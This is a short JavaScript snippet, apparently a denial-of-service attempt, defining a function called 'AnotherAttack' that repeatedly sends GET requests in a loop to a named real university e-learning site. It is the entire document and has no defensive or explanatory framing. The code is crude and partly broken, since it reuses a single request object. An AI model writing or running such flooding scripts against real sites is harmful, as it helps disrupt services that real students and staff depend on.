function AnotherAttack(){
    const HttpReq = new XMLHttpRequest();
    const url = 'https://elearning.maseno.ac.ke/';
    for (let index = 0; index <= 100; index++) {
        HttpReq.open("GET", url);
        HttpReq.send();
        console.log("sent");
    }
}